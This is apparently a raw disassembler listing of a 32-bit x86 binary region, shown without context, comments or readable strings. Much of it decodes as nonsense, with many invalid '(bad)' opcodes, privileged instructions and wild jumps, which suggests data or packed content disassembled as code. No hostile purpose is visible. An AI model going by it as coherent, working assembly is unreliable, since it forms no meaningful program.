  42fcfb:	pop    edi
  42fcfc:	jmp    0x42fcdf
  42fcfe:	push   ss
  42fcff:	mov    edi,0x102f7f9e
  42fd04:	xlat   BYTE PTR ds:[ebx]
  42fd05:	jmp    0xd4e01334
  42fd0a:	mov    al,0x36
  42fd0c:	or     bl,ch
  42fd0e:	fs jb  0x42fcdd
  42fd11:	or     al,0x81
  42fd13:	ja     0x42fcac
  42fd15:	adc    DWORD PTR ss:[ecx],ecx
  42fd18:	inc    ebp
  42fd19:	into   
  42fd1a:	jl     0x42fcd7
  42fd1c:	fild   WORD PTR [ebx]
  42fd1e:	(bad)  
  42fd1f:	aam    0xd4
  42fd21:	outs   dx,BYTE PTR ds:[esi]
  42fd22:	jge    0x42fd79
  42fd24:	mov    bl,0xd3
  42fd26:	xor    BYTE PTR [edi],ah
  42fd28:	(bad)  
  42fd29:	shl    BYTE PTR [esi+0x54ea1780],1
  42fd2f:	pop    es
  42fd30:	loope  0x42fd4b
  42fd32:	pop    esp
  42fd33:	sbb    DWORD PTR [edi-0x7a244904],ecx
  42fd39:	jg     0x42fd6e
  42fd3b:	les    edx,FWORD PTR ds:0x73309395
  42fd41:	iret   
  42fd42:	arpl   WORD PTR [edx],cx
  42fd44:	jne    0x42fd2f
  42fd46:	pop    esp
  42fd47:	icebp  
  42fd48:	xor    esp,edx
  42fd4a:	and    al,0xc6
  42fd4c:	hlt    
  42fd4d:	cmp    eax,0xb58fbf00
  42fd52:	add    ebx,DWORD PTR [edi]
  42fd54:	ins    DWORD PTR es:[edi],dx
  42fd55:	lea    edx,[esi-0x4acc355e]
  42fd5b:	(bad)  
  42fd5c:	mov    ecx,0x8982905
  42fd61:	mov    ch,0x5e
  42fd63:	mov    ah,0xa1
  42fd65:	push   ds
  42fd66:	sub    DWORD PTR [edx+0xe76c630],eax
  42fd6c:	loope  0x42fd3d
  42fd6e:	sub    al,0x37
  42fd70:	sbb    BYTE PTR [esi+esi*4-0x7c],0x99
  42fd75:	aad    0x54
  42fd77:	jecxz  0x42fde7
  42fd79:	cli    
  42fd7a:	les    ecx,FWORD PTR [edx-0x22]
  42fd7d:	mov    ebp,0x851aba99
  42fd82:	sbb    dl,dh
  42fd84:	cmp    edx,ebx
  42fd86:	shr    ecx,cl
  42fd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd89:	enter  0xc381,0xc7
  42fd8d:	adc    edx,0xcaa75eb8
  42fd93:	jno    0x42fd42
  42fd95:	mov    ch,dl
  42fd97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd98:	sub    eax,DWORD PTR gs:[edi+0x31]
  42fd9c:	fnstenv [edx-0x3d289526]
  42fda2:	shl    ebp,0x42
  42fda5:	lea    edi,[ebp+edx*1-0x1e0e269e]
  42fdac:	int    0x25
  42fdae:	mov    al,ds:0x3dedc58e
  42fdb3:	dec    esi
  42fdb4:	xchg   BYTE PTR [ebp+0x39],bl
  42fdb7:	cmp    bl,BYTE PTR [eax-0x3d]
  42fdba:	add    BYTE PTR [ecx-0x5a],0xa3
  42fdbe:	ret    
  42fdbf:	ins    BYTE PTR es:[edi],dx
  42fdc0:	rcl    DWORD PTR [ecx+0x25],1
  42fdc3:	sahf   
  42fdc4:	cmp    BYTE PTR ds:0x86bf26b5,ah
  42fdca:	es dec edi
  42fdcc:	sar    DWORD PTR [ecx+ebp*4],1
  42fdcf:	(bad)  
  42fdd0:	fmul   DWORD PTR [edi+0x2e66101e]
  42fdd6:	dec    ebp
  42fdd7:	lods   al,BYTE PTR ds:[esi]
  42fdd8:	or     BYTE PTR [edi-0x30],dl
  42fddb:	cdq    
  42fddc:	jb     0x42fd7c
  42fdde:	push   ecx
  42fddf:	mov    bl,BYTE PTR [esi-0x47e04553]
  42fde5:	ret    0xdfb5
  42fde8:	neg    DWORD PTR [ecx+0x59b39b90]
	...
  42fe56:	dec    eax
  42fe57:	rol    dl,0xf0
  42fe5a:	retf   0x7af2
  42fe5d:	clc    
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz hlt 
  42fe63:	xchg   esi,eax
  42fe64:	or     BYTE PTR [edx+0x20167],ah
  42fe6a:	add    BYTE PTR [ecx],al
  42fe6c:	add    BYTE PTR [eax],al
  42fe6e:	cmp    eax,0x1663a3bd
  42fe73:	fbstp  TBYTE PTR [eax]
  42fe75:	aaa    
  42fe76:	(bad)  
  42fe77:	mov    ebx,0xca99b83a
  42fe7c:	mov    bl,0x7e
  42fe7e:	mov    ebx,0x510f09b5
  42fe83:	mov    al,dh
  42fe85:	inc    esp
  42fe86:	(bad)  
  42fe88:	fwait
  42fe89:	inc    esi
  42fe8a:	sbb    al,0x1c
  42fe8c:	in     al,dx
  42fe8d:	xchg   edx,eax
  42fe8e:	ss mov ch,0x2
  42fe91:	xor    DWORD PTR [eax-0x4681a5a1],ebp
  42fe97:	in     eax,0x7d
  42fe99:	jecxz  0x42fe8f
  42fe9b:	enter  0x4225,0x6c
  42fe9f:	fs jg  0x42fed6
  42fea2:	adc    dl,cl
  42fea4:	retf   
  42fea5:	repz sbb eax,0x3ececa0
  42feab:	iret   
  42feac:	pop    edx
  42fead:	sbb    al,0xc8
  42feaf:	push   eax
  42feb0:	xor    al,0x1c
  42feb2:	lods   eax,DWORD PTR ds:[esi]
  42feb3:	arpl   WORD PTR fs:[edi+edi*4],ax
  42feb7:	mov    ebp,0x1d3b638d
  42febc:	or     DWORD PTR [edi-0x2],edx
  42febf:	and    eax,0x327c0fe2
  42fec4:	push   edi
  42fec5:	clc    
  42fec6:	cmc    
  42fec7:	mov    edx,0x76e429a2
  42fecc:	jbe    0x42fe81
  42fece:	sti    
  42fecf:	pop    esp
  42fed0:	sub    DWORD PTR [edx+0x6e],esi
  42fed3:	jmp    0xfa0ebcce
  42fed8:	inc    ecx
  42fed9:	sbb    bh,BYTE PTR [edx]
  42fedb:	mov    DWORD PTR [ecx],edx
  42fedd:	add    al,0xf2
  42fedf:	cmp    al,0x71
  42fee1:	fnstcw WORD PTR ds:0x340dc72a
  42fee7:	mov    WORD PTR [eax+0x2bec7413],ds
  42feed:	jnp    0x42fee8
  42feef:	mov    dl,0x92
  42fef1:	adc    eax,0xaad52e8b
  42fef6:	stos   DWORD PTR es:[edi],eax
  42fef7:	pop    ebp
  42fef8:	xchg   ebx,eax
  42fef9:	mov    ah,0xb6
  42fefb:	aas    
  42fefc:	push   esp
  42fefd:	cmp    BYTE PTR [ebp+0x3e],cl
  42ff00:	loop   0x42ff1a
  42ff02:	adc    al,cl
  42ff04:	mov    esp,0xae5291d4
  42ff09:	push   esp
  42ff0a:	mov    al,0x8e
  42ff0c:	(bad)  
  42ff0d:	clc    
  42ff0e:	mov    edi,0xa5dc317a
  42ff13:	mov    eax,ebp
  42ff15:	std    
  42ff16:	ja     0x42ff67
  42ff18:	mov    ebp,0xf5fe76fe
  42ff1d:	inc    esi
  42ff1e:	mov    eax,0xfe7044a0
  42ff23:	cli    
  42ff24:	lahf   
  42ff25:	lds    esi,FWORD PTR [ebx+0x28b398]
  42ff2b:	jnp    0x42ff73
  42ff2d:	sahf   
  42ff2e:	enter  0x7942,0xd1
  42ff32:	cmp    DWORD PTR [edx],eax
  42ff34:	push   ds
  42ff35:	stc    
  42ff36:	or     DWORD PTR [edi+0x228db8fc],edx
  42ff3c:	cdq    
  42ff3d:	pop    edi
  42ff3e:	cld    
  42ff3f:	and    eax,0xa5b39bcc
  42ff44:	jns    0x42ff0f
  42ff46:	retf   
  42ff47:	je     0x42ff61
  42ff49:	mov    DWORD PTR [esi+ebx*8-0x5f],ebp
  42ff4d:	fld    TBYTE PTR [edi-0x14c959d2]
  42ff53:	mov    ds:0xf640dcac,al
  42ff58:	and    eax,0xd1aa1942
  42ff5d:	sub    cl,dl
  42ff5f:	fcomp  QWORD PTR [eax]
  42ff61:	aaa    
  42ff62:	daa    
  42ff63:	mov    bl,0x78
  42ff65:	or     edx,DWORD PTR [ecx+0x13]
  42ff68:	or     dl,BYTE PTR [esi-0x71b1fc08]
	...
  42ffd6:	add    al,0x67
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [eax+eiz*2+0x6],0x92
  42ffe5:	outs   dx,DWORD PTR ds:[esi]
  42ffe6:	add    al,BYTE PTR [bp+si]
  42ffe9:	add    BYTE PTR [ebp+0x18000000],ch
  42ffef:	sub    bl,ch
  42fff1:	add    eax,DWORD PTR [esi+0x5e]
  42fff4:	fcomp  DWORD PTR [ebx+0x6e]
  42fff7:	loope  0x430061
  42fff9:	push   edx
  42fffa:	jl     0x43000d
  42fffc:	outs   dx,DWORD PTR gs:[esi]
  42fffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffff:	fcomp  QWORD PTR [esi]
  430001:	lahf   
  430002:	cwde   
  430003:	xor    eax,0xe7eb63b6
  430008:	or     esp,DWORD PTR [edi+0x21a4abf5]
  43000e:	aaa    
  43000f:	xor    DWORD PTR [ecx-0x786c5ef3],esi
  430015:	sti    
  430016:	add    DWORD PTR [edx],edi
  430018:	sub    dl,ch
  43001a:	pop    ebp
  43001b:	dec    ecx
  43001c:	(bad)  
  43001d:	fild   DWORD PTR [eax]
  43001f:	icebp  
  430020:	sbb    al,0x6a
  430022:	aas    
  430023:	sub    al,0x89
  430025:	jnp    0x43000d
  430027:	cdq    
  430028:	xor    eax,DWORD PTR [ebp-0x247dd0e7]
  43002e:	push   edx
  43002f:	bnd ret 
  430031:	sbb    al,0x79
  430033:	mov    esi,es
  430035:	(bad)  
  430036:	cs stos DWORD PTR es:[edi],eax
  430038:	jae    0x430001
  43003a:	iret   
  43003b:	(bad)  
  43003c:	outs   dx,DWORD PTR ds:[esi]
  43003d:	xlat   BYTE PTR ds:[ebx]
  43003e:	not    BYTE PTR [edi]
  430040:	data16 hlt 
  430042:	mov    al,0x73
  430044:	addr16 imul ecx,ebp,0xf4fa7b8f
  43004b:	sub    eax,0xa4fb42e8
  430050:	std    
  430051:	sahf   
  430052:	stc    
  430053:	mov    edi,0x68bb56e6
  430058:	addr16 adc bh,dh
  43005b:	push   edx
  43005c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  43005e:	mov    dl,0xba
  430060:	mov    dh,0x9d
  430062:	push   DWORD PTR [ebp+eax*8+0x20]
  430066:	(bad)  
  430067:	lods   eax,DWORD PTR ds:[esi]
  430068:	pop    es
  430069:	mov    eax,0x995687c0
  43006e:	mov    al,0xda
  430070:	sbb    bh,bl
  430072:	adc    eax,ecx
  430074:	inc    DWORD PTR [eax+0x73]
  430077:	adc    dl,BYTE PTR [edx]
  430079:	(bad)  
  43007a:	pop    edx
  43007b:	call   0x5c6be6f9
  430080:	xor    eax,0x64dd6b60
  430085:	jl     0x430014
  430087:	outs   dx,DWORD PTR ds:[esi]
  430088:	(bad)  
  430089:	and    al,0x1d
  43008b:	inc    ecx
  43008c:	(bad)  
  43008d:	imul   esi,DWORD PTR [edx+0x6c973ebc],0x22f912d6
  430097:	add    eax,0x138fee
	...
  4300d4:	add    BYTE PTR [eax],al
  4300d6:	dec    ebp
  4300d7:	push   ebp
  4300d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4300de:	mov    esp,ebp
  4300e0:	or     al,ah
  4300e2:	dec    ebp
  4300e3:	add    bh,al
  4300e5:	add    BYTE PTR [eax],cl
  4300e7:	add    BYTE PTR [eax],al
  4300e9:	mov    DWORD PTR [eax],0x3ff44545
  4300ef:	xor    DWORD PTR [eax],eax
  4300f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4300f7:	(bad)  
  4300f8:	enter  0x4d45,0xb8
  4300fc:	mov    esi,DWORD PTR [edx]
  4300fe:	hlt    
  4300ff:	test   ebx,ecx
  430101:	pushf  
  430102:	enter  0x4df8,0x8b
  430106:	mov    DWORD PTR [ebp+0x8],0x894708
  43010d:	inc    ebp
  43010e:	mov    ebp,0xff8bfffc
  430113:	dec    ebp
  430114:	mov    ch,0xf4
  430116:	call   DWORD PTR [ebx-0x1]
  430119:	mov    ebx,0x8005426
  43011e:	call   DWORD PTR [ecx+0x8]
  430121:	pop    es
  430122:	jmp    0xb8:0x9cb4533
  430129:	fwait
  43012a:	mov    esi,DWORD PTR [edx-0xc]
  43012d:	xor    al,bl
  43012f:	add    BYTE PTR [ebx+0x3c83203],bl
  430135:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43013b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430141:	xor    eax,DWORD PTR [eax]
  430143:	retf   
  430144:	ret    
  430145:	add    eax,esi
  430147:	enter  0x8945,0x64
  43014b:	dec    ebp
  43014c:	sbb    ah,cl
  43014e:	add    BYTE PTR [ebx-0xb87b277],cl
  430154:	dec    DWORD PTR [ebx-0xbcfb275]
  43015a:	test   DWORD PTR [ebx],esi
  43015c:	dec    ebx
  43015e:	inc    DWORD PTR [ebx]
  430160:	inc    eax
  430161:	enter  0x8989,0x64
  430165:	(bad)  
  430166:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43016a:	cld    
  43016b:	dec    DWORD PTR [ebp-0xa90001]
  430171:	push   edi
  430172:	mov    BYTE PTR [edx+0x1],ch
  430175:	and    DWORD PTR [eax],eax
  430177:	pop    ecx
  430178:	inc    ebp
  430179:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43017f:	push   0xffffff89
  430181:	pop    ecx
  430182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430183:	dec    ebp
  430184:	add    BYTE PTR [ecx+0x45fc088b],cl
  43018a:	jne    0x4301d5
  43018c:	lea    eax,[eax]
  43018e:	fs (bad) 
  430190:	dec    DWORD PTR [eax]
  430192:	mov    DWORD PTR [eax],eax
  430194:	test   al,0x0
  430196:	add    BYTE PTR [ebp-0x18],cl
  430199:	xor    ebp,DWORD PTR [edx]
  43019b:	add    eax,DWORD PTR [eax]
  43019d:	mov    eax,eax
  43019f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301a6:	inc    ebp
  4301a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4301ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4301b3:	inc    eax
  4301b4:	cmp    bh,0x1
  4301b7:	lea    eax,[eax]
  4301b9:	and    BYTE PTR [eax],al
  4301bb:	inc    DWORD PTR [ecx-0x18]
  4301be:	mov    ecx,DWORD PTR [ebx]
  4301c0:	cld    
  4301c1:	add    BYTE PTR [ecx+0x75014d],cl
  4301c7:	(bad)  
  4301c8:	xchg   ebp,eax
  4301c9:	sar    bh,1
  4301cb:	inc    eax
  4301cc:	inc    DWORD PTR [eax]
  4301ce:	mov    eax,DWORD PTR [ebp-0x4]
  4301d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4301d7:	add    BYTE PTR [edx],dl
  4301d9:	(bad)  
  4301da:	nop
  4301db:	inc    ebp
  4301dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4301e2:	mov    al,0xff
  4301e4:	add    bh,bh
  4301e6:	add    BYTE PTR [ebx],dh
  4301e8:	inc    DWORD PTR [ebx]
  4301ea:	sbb    al,0x89
  4301ec:	jne    0x4301ca
  4301ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4301f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4301fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430201:	inc    DWORD PTR [ebp-0x75]
  430204:	fisttp QWORD PTR [esi+ebp*8]
  430207:	test   DWORD PTR [esi-0x1],esp
  43020a:	inc    ebp
  43020b:	(bad)  
  43020c:	aas    
  43020d:	inc    ebp
  43020e:	(bad)  
  43020f:	lea    edi,[eax+edi*2-0x1]
  430213:	inc    edi
  430215:	mov    DWORD PTR ds:0x8000c7a0,edi
  43021b:	mov    ebp,esp
  43021d:	cld    
  43021e:	loop   0x4301ad
  430220:	inc    ebp
  430221:	(bad)  
  430222:	out    dx,al
  430223:	(bad)  
  430224:	fisttp WORD PTR [eax+0x8801c7]
  43022a:	jecxz  0x430271
  43022c:	in     al,dx
  43022d:	inc    DWORD PTR [ebp-0x4]
  430230:	out    0x8d,eax
  430232:	aas    
  430233:	(bad)  
  430234:	call   0xcb2d38
  430239:	add    DWORD PTR [ebx-0x7f490400],ecx
  43023f:	add    BYTE PTR [ecx],al
  430241:	test   DWORD PTR [eax],eax
  430243:	wrmsr  
  430245:	ja     0x430242
  430247:	add    BYTE PTR [eax],al
  430249:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43024f:	add    esp,edi
  430251:	add    BYTE PTR [eax+0x450108],al
  430257:	mov    edi,DWORD PTR [ebp-0x6c]
  43025a:	add    DWORD PTR [eax],0x4
  43025d:	mov    eax,DWORD PTR [ebp+0x3]
  430260:	mov    edi,DWORD PTR [esp+edi*8]
  430263:	dec    ebp
  430264:	nop
  430265:	mov    eax,DWORD PTR [ecx]
  430267:	fadd   DWORD PTR [eax]
  430269:	add    BYTE PTR [ecx*4-0xafa000],dl
  430270:	inc    ebp
  430271:	push   edx
  430272:	call   DWORD PTR [ebp-0x7b]
  430275:	mov    esi,DWORD PTR [ebp-0x74]
  430278:	mov    eax,DWORD PTR [eax]
  43027a:	cld    
  43027b:	mov    eax,DWORD PTR [eax+0x880103]
  430281:	add    BYTE PTR [ebp+0x6a],bh
  430284:	cmp    edi,0x10
  430287:	mov    WORD PTR [ebp+0x0],es
  43028a:	mov    edx,DWORD PTR [edx-0x4]
  43028d:	push   ecx
  43028e:	nop
  43028f:	inc    DWORD PTR [ecx]
  430291:	cld    
  430292:	add    BYTE PTR [ebp-0x16],bh
  430295:	mov    eax,DWORD PTR [eax]
  430297:	cld    
  430298:	push   eax
  430299:	nop
  43029a:	inc    ebp
  43029b:	add    edi,edi
  43029d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4302a3:	jmp    0xe33b:0x9403c733
  4302aa:	movntq QWORD PTR [edx],mm7
  4302ad:	mov    DWORD PTR [eax],0xb87e8b98
  4302b3:	test   ebx,eax
  4302b5:	jmp    DWORD PTR [ebp-0x1]
  4302b8:	int    0xed
  4302ba:	sub    esp,esi
  4302bc:	add    eax,DWORD PTR [ebp-0x30]
  4302bf:	fild   WORD PTR [ebp+0x3f]
  4302c2:	cmp    eax,edi
  4302c4:	je     0xc043e8ea
  4302ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4302d1:	(bad)  
  4302d2:	jne    0x430260
  4302d4:	mov    ebx,ebp
  4302d6:	cld    
  4302d7:	jle    0x43031e
  4302d9:	dec    ecx
  4302da:	mov    eax,DWORD PTR [eax]
  4302dc:	mov    ah,0x50
  4302de:	add    BYTE PTR [ebp-0x18],al
  4302e1:	mov    ebp,DWORD PTR [ecx]
  4302e3:	test   al,0x0
  4302e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4302eb:	add    DWORD PTR es:[eax],eax
  4302ee:	add    al,al
  4302f0:	xor    BYTE PTR [eax+0x4f],dl
  4302f3:	inc    ebp
  4302f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4302fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430300:	add    DWORD PTR [ecx+0x458be845],ecx
  430306:	fmul   DWORD PTR [ebx+0x8bb800]
  43030c:	cld    
  43030d:	call   0xd82dd2
  430312:	dec    DWORD PTR [ebx+0x109ee8ff]
  430318:	add    al,al
  43031a:	push   eax
  43031b:	es inc ebp
  43031d:	inc    ebp
  43031e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430324:	dec    DWORD PTR [ebx-0x3ff70301]
  43032a:	mov    DWORD PTR gs:[eax],eax
  43032d:	call   0x8c134867
  430332:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430339:	sub    eax,ebx
  43033b:	add    BYTE PTR [eax],al
  43033d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430343:	inc    ebp
  430344:	push   ebp
  430345:	mov    ebp,eax
  430347:	shr    BYTE PTR [ecx],1
  430349:	ret    
  43034a:	add    dh,al
  43034c:	mov    eax,ecx
  43034e:	cld    
  43034f:	test   BYTE PTR [eax+0x101],al
  430355:	inc    ebp
  430356:	xor    BYTE PTR [ebx],dh
  430358:	push   edi
  430359:	mov    ecx,0xffe48d89
  43035e:	inc    ebp
  43035f:	enter  0x4d8b,0xfc
  430363:	mov    eax,ebx
  430365:	or     BYTE PTR [ebx+0x38732c1],bl
  43036b:	add    DWORD PTR [ebp-0xbac000],ecx
  430371:	add    al,ch
  430373:	add    BYTE PTR [ecx],ch
  430375:	inc    DWORD PTR [eax]
  430377:	cld    
  430378:	mov    edi,DWORD PTR [ebp-0xc]
  43037b:	mov    esi,DWORD PTR [ebp-0x4]
  43037e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430384:	and    BYTE PTR [ebp+0x50e800ff],bl
  43038a:	sub    DWORD PTR [ebp+0x0],eax
  43038d:	mov    edi,edi
  43038f:	test   al,0xe4
  430391:	add    BYTE PTR [ebp-0x1],cl
  430394:	xor    ebp,eax
  430396:	add    esp,DWORD PTR [esi]
  430398:	cmp    eax,DWORD PTR [eax]
  43039a:	jne    0x4303e9
  43039c:	(bad)  
  43039d:	mov    ebx,eax
  43039f:	pushf  
  4303a0:	add    BYTE PTR [eax],al
  4303a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4303a8:	or     BYTE PTR [eax+0x8401c3],bh
  4303ae:	fwait
  4303af:	jne    0x4303e3
  4303b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4303b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4303bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4303c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4303ca:	add    BYTE PTR [edi+0x45],dl
  4303cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4303d4:	gs test ebp,ecx
  4303d7:	je     0x430404
  4303d9:	mov    eax,DWORD PTR [ebx]
  4303db:	cld    
  4303dc:	sar    BYTE PTR [eax+0x3b0145],1
  4303e2:	pcmpeqw mm4,mm2
  4303e5:	xor    edi,edi
  4303e7:	lea    ecx,[ebx-0x23927470]
  4303ed:	add    BYTE PTR [ebp+0x50],cl
  4303f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4303f3:	mov    ebp,DWORD PTR [eax-0x68]
  4303f6:	test   DWORD PTR [eax],eax
  4303f8:	clc    
  4303f9:	push   DWORD PTR [ebp-0x1]
  4303fc:	lea    ecx,[eax]
  4303fe:	int3   
  4303ff:	inc    ebp
  430400:	call   0xfb3590
  430405:	jne    0x4303ff
  430407:	xor    edi,DWORD PTR [ebp-0x41]
  43040a:	jmp    0x43047e
  43040c:	mov    eax,DWORD PTR [eax]
  43040e:	mov    eax,0x339545c7
  430413:	inc    DWORD PTR [ebx]
  430415:	push   DWORD PTR [ecx]
  430417:	inc    ecx
  430418:	mov    eax,DWORD PTR [eax]
  43041a:	jmp    0x43046c
  43041c:	mov    eax,DWORD PTR [ebp-0x3c]
  43041f:	mov    eax,eax
  430421:	cld    
  430422:	clc    
  430423:	ret    
  430424:	test   bh,al
  430426:	pop    es
  430427:	xchg   ebp,eax
  430428:	add    bh,bh
  43042a:	inc    ebp
  43042b:	dec    DWORD PTR [edi]
  43042d:	sub    ebp,DWORD PTR [ebx]
  43042f:	add    BYTE PTR [eax],al
  430431:	push   eax
  430432:	jbe    0x430489
  430434:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43043a:	or     al,0xcf
  43043c:	inc    eax
  43043d:	enter  0x745,0x72
  430441:	inc    ebp
  430442:	mov    eax,DWORD PTR [ecx]
  430444:	int3   
  430445:	add    BYTE PTR [ebp-0x75],al
  430448:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43044e:	ror    BYTE PTR [ebp+0x72f80885],1
  430454:	inc    ebp
  430455:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43045b:	fadd   st,st(6)
  43045d:	rol    BYTE PTR [ebp+0x12],0x8b
  430461:	inc    ebp
  430462:	fmul   QWORD PTR [ebx-0x3c39233d]
  430468:	inc    ebp
  430469:	test   bh,al
  43046b:	fwait
  43046c:	clc    
  43046d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430473:	inc    ebp
  430474:	xor    esi,DWORD PTR [ebx]
  430476:	pushf  
  430477:	mov    ecx,0xffb48dc7
  43047c:	test   eax,ecx
  43047e:	clc    
  43047f:	dec    ebp
  430480:	inc    ebp
  430481:	mov    edi,DWORD PTR ds:0xc7c19c08
  430487:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43048e:	inc    ebp
  43048f:	inc    ebp
  430490:	aas    
  430491:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430498:	test   DWORD PTR [ecx],esi
  43049a:	clc    
  43049b:	pushf  
  43049c:	inc    ebp
  43049d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4304a3:	push   eax
  4304a4:	mov    BYTE PTR [edx],0x7d
  4304a7:	add    BYTE PTR [ebx],bh
  4304a9:	mov    ecx,DWORD PTR [edi]
  4304ab:	mov    DWORD PTR [eax],ebx
  4304ad:	les    eax,FWORD PTR [eax]
  4304af:	adc    ebp,ecx
  4304b1:	dec    ebp
  4304b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4304b8:	mov    ecx,esi
  4304ba:	lock or al,cl
  4304bd:	clc    
  4304be:	inc    ebp
  4304bf:	add    esi,DWORD PTR [ebx]
  4304c1:	jge    0x4304c6
  4304c3:	xor    edi,DWORD PTR [ebx]
  4304c5:	cmp    ecx,DWORD PTR [edi]
  4304c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4304cc:	mov    edi,DWORD PTR [ecx]
  4304ce:	test   al,0xcc
  4304d0:	dec    ebp
  4304d1:	test   BYTE PTR [ebx],dh
  4304d3:	pop    es
  4304d4:	xor    eax,DWORD PTR [eax]
  4304d6:	add    ecx,DWORD PTR [esi]
  4304d8:	add    ecx,eax
  4304da:	psraw  mm0,mm1
  4304dd:	sub    BYTE PTR [ebp+0x38],cl
  4304e0:	mov    edi,DWORD PTR [ebx]
  4304e2:	lock int3 
  4304e4:	shl    edx,1
  4304e6:	rol    BYTE PTR [ebp+0xc],1
  4304e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4304f0:	jmp    0x75053a
  4304f5:	pushf  
  4304f6:	inc    ebp
  4304f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4304fd:	xor    ecx,ebx
  4304ff:	add    ecx,esi
  430501:	mov    esi,eax
  430503:	enter  0x45af,0x8b
  430507:	xor    ecx,eax
  430509:	add    edx,DWORD PTR [ebp-0x77]
  43050c:	sub    ecx,DWORD PTR [eax]
  43050e:	cmp    eax,DWORD PTR [ebp+0x77]
  430511:	ror    DWORD PTR [ebx-0x76385764],1
  430517:	test   al,0x0
  430519:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43051f:	cmp    al,0x33
  430521:	pushf  
  430522:	xor    eax,edi
  430524:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43052b:	inc    ebp
  43052c:	dec    ebp
  43052d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430535:	test   DWORD PTR ds:0xeb4545f8,eax
  43053b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430541:	fdiv   QWORD PTR [ebx]
  430543:	dec    ebp
  430544:	xor    esi,DWORD PTR [ebx]
  430546:	add    eax,DWORD PTR [ebx]
  430548:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43054e:	dec    ebp
  43054f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430555:	out    dx,eax
  430556:	rol    BYTE PTR [eax],1
  430558:	add    eax,0xebc8458b
  43055d:	dec    ebp
  43055e:	mov    ebp,DWORD PTR [ebx]
  430560:	mov    esp,0x33f84d8b
  430565:	ret    
  430566:	xor    eax,esi
  430568:	add    ecx,eax
  43056a:	add    eax,DWORD PTR [edx+0xc1010f]
  430570:	dec    ebp
  430571:	inc    ebp
  430572:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430578:	ror    bl,1
  43057a:	add    eax,0xebc645ce
  43057f:	scas   eax,DWORD PTR es:[edi]
  430580:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430586:	xor    ebp,DWORD PTR [ebx]
  430588:	xor    edi,DWORD PTR [ebx]
  43058a:	add    esi,DWORD PTR [edi+0x3]
  43058d:	mov    ecx,DWORD PTR [edi]
  43058f:	clc    
  430590:	rol    ebx,0x4d
  430593:	(bad)  
  430594:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43059b:	mov    ah,0x45
  43059d:	dec    ebp
  43059e:	jbe    0x4305d3
  4305a0:	mov    esi,DWORD PTR [ebx]
  4305a2:	call   0x334652aa
  4305a7:	rdpmc  
  4305a9:	rol    DWORD PTR [ebx],0x4d
  4305ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4305b2:	inc    ebp
  4305b3:	ror    BYTE PTR [ebx+0x45450808],1
  4305b9:	jmp    0x10b0649
  4305be:	inc    ebp
  4305bf:	inc    ebp
  4305c0:	(bad)  
  4305c1:	mov    ebx,eax
  4305c3:	clc    
  4305c4:	test   ebx,eax
  4305c6:	clc    
  4305c7:	retf   
  4305c8:	inc    ebp
  4305c9:	into   
  4305ca:	mov    esi,0x8b85afec
  4305d0:	clc    
  4305d1:	enter  0x5545,0x33
  4305d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4305dc:	ret    
  4305dd:	mov    ah,0xc6
  4305df:	addr16 push 0x338b4545
